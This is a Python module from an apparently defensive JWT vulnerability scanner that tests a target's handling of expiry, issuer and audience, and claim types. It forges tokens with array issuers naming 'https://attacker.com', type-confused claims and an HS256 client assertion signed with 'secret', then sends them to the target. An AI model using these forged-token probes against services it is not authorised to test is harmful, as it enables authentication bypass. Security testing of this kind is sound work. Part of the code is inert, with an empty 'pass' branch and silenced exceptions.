import json
import base64
import time
from datetime import datetime
from urllib.parse import urljoin

from ..enums import _kurtVuln_list, Level
from ..models import jq_vuln_list
from ..constants import OAUTH2_TOKEN_ENDPOINT_PATH, TYPE_CONFUSION_CLAIMS


def test_expiration(scanner) -> None:
    """Test token expiration claims"""
    from colorama import Fore, Style

    print(f"\n{Fore.YELLOW}[*] Testing expiration claims...{Style.RESET_ALL}")

    if "exp" not in scanner.payload:
        vuln = jq_vuln_list(
            type=_kurtVuln_list.EXPIRATION_MISSING,
            severity="MEDIUM",
            description="Token missing 'exp' claim (no expiration)",
            exploit_payload=None,
            proof="Token payload has no exp field",
            endpoint=scanner.target_url,
            chainable_with=[],
            cvss_score=5.0,
        )
        scanner.vulnerabilities.append(vuln)
        print(f"{Fore.YELLOW}[!] Token missing expiration claim{Style.RESET_ALL}")
    else:
        exp = scanner.payload["exp"]
        try:
            exp_time = datetime.fromtimestamp(exp)
            now = datetime.now()
            delta = exp_time - now

            if delta.total_seconds() > 86400 * 30:
                vuln = jq_vuln_list(
                    type=_kurtVuln_list.EXPIRATION_LONG,
                    severity="LOW",
                    description=f"Token expiration too long ({delta.days} days)",
                    exploit_payload=None,
                    proof=f"Expires at {exp_time}",
                    endpoint=scanner.target_url,
                    chainable_with=[],
                    cvss_score=3.0,
                )
                scanner.vulnerabilities.append(vuln)
                print(
                    f"{Fore.YELLOW}[!] Token expiration is very long ({delta.days} days){Style.RESET_ALL}"
                )
            else:
                print(
                    f"{Fore.GREEN}[-] Token expiration is reasonable{Style.RESET_ALL}"
                )
        except:
            pass


def test_audience_issuer(scanner) -> None:
    """Test audience and issuer validation bypass"""
    from colorama import Fore, Style
    import jwt

    print(f"\n{Fore.YELLOW}[*] Testing audience/issuer validation...{Style.RESET_ALL}")

    if "iss" in scanner.payload:
        original_iss = scanner.payload["iss"]
        payload_mod = scanner.payload.copy()
        payload_mod["iss"] = [original_iss, "https://attacker.com"]

        encoded_payload = (
            base64.urlsafe_b64encode(json.dumps(payload_mod).encode())
            .decode()
            .rstrip("=")
        )
        parts = scanner.original_token.split(".")
        forged_token = f"{parts[0]}.{encoded_payload}.{scanner.signature}"

        response = scanner.make_request(
            scanner.target_url, forged_token, delay=scanner.delay
        )

        if response.status_code == 200:
            vuln = jq_vuln_list(
                type=_kurtVuln_list.ISSUER_VALIDATION_BYPASS,
                severity="HIGH",
                description="Issuer validation bypass via array (CVE-2025-30144)",
                exploit_payload=str(payload_mod["iss"]),
                proof="Accepted token with array issuer",
                endpoint=scanner.target_url,
                chainable_with=[_kurtVuln_list.AUDIENCE_VALIDATION_BYPASS],
                cve_reference="CVE-2025-30144",
                cvss_score=8.2,
            )
            scanner.vulnerabilities.append(vuln)
            print(
                f"{Fore.RED}[!] Issuer validation bypass possible (array)!{Style.RESET_ALL}"
            )

    if "aud" in scanner.payload:
        original_aud = scanner.payload["aud"]
        payload_mod = scanner.payload.copy()
        payload_mod["aud"] = [original_aud, "attacker"]

        encoded_payload = (
            base64.urlsafe_b64encode(json.dumps(payload_mod).encode())
            .decode()
            .rstrip("=")
        )
        parts = scanner.original_token.split(".")
        forged_token = f"{parts[0]}.{encoded_payload}.{scanner.signature}"

        response = scanner.make_request(
            scanner.target_url, forged_token, delay=scanner.delay
        )

        if response.status_code == 200:
            vuln = jq_vuln_list(
                type=_kurtVuln_list.AUDIENCE_VALIDATION_BYPASS,
                severity="HIGH",
                description="Audience validation bypass via array",
                exploit_payload=str(payload_mod["aud"]),
                proof="Accepted token with array audience",
                endpoint=scanner.target_url,
                chainable_with=[_kurtVuln_list.ISSUER_VALIDATION_BYPASS],
                cvss_score=8.2,
            )
            scanner.vulnerabilities.append(vuln)
            print(
                f"{Fore.RED}[!] Audience validation bypass possible (array)!{Style.RESET_ALL}"
            )

    token_endpoint = urljoin(scanner.target_url, OAUTH2_TOKEN_ENDPOINT_PATH)

    if scanner.level.value >= Level.HIGH.value:
        try:
            client_auth_payload = {
                "iss": "client_id",
                "sub": "client_id",
                "aud": token_endpoint,
                "jti": "dummy",
                "exp": int(time.time()) + 300,
            }

            forged_token = jwt.encode(client_auth_payload, "secret", algorithm="HS256")
            response = scanner.session.post(
                token_endpoint,
                data={
                    "client_assertion": forged_token,
                    "client_assertion_type": "urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
                },
            )
            if response.status_code != 401 and "aud" in response.text.lower():
                pass
        except:
            pass


def test_claim_type_confusion(scanner) -> None:
    """Test claim type confusion"""
    from colorama import Fore, Style

    print(
        f"\n{Fore.YELLOW}[*] Testing claim type confusion (CVE-2026-25537)...{Style.RESET_ALL}"
    )

    for claim, malicious_value in TYPE_CONFUSION_CLAIMS.items():
        if claim not in scanner.payload:
            continue
        try:
            payload_mod = scanner.payload.copy()
            payload_mod[claim] = malicious_value

            encoded_payload = (
                base64.urlsafe_b64encode(json.dumps(payload_mod).encode())
                .decode()
                .rstrip("=")
            )
            parts = scanner.original_token.split(".")
            forged_token = f"{parts[0]}.{encoded_payload}.{scanner.signature}"

            response = scanner.make_request(
                scanner.target_url, forged_token, delay=scanner.delay
            )

            if (
                response.status_code == 200
                and "unauthorized" not in response.text.lower()
            ):
                vuln = jq_vuln_list(
                    type=_kurtVuln_list.CLAIM_TYPE_CONFUSION,
                    severity="MEDIUM",
                    description=f"Claim '{claim}' type confusion: server accepts string instead of number",
                    exploit_payload=f"{claim}={malicious_value}",
                    proof=f"Token accepted with malformed {claim}",
                    endpoint=scanner.target_url,
                    chainable_with=[],
                    cve_reference="CVE-2026-25537",
                    cvss_score=5.5,
                )
                scanner.vulnerabilities.append(vuln)
                print(
                    f"{Fore.RED}[!] Claim type confusion possible for {claim}!{Style.RESET_ALL}"
                )
                return
        except Exception:
            continue

    print(f"{Fore.GREEN}[-] Not vulnerable to claim type confusion{Style.RESET_ALL}")
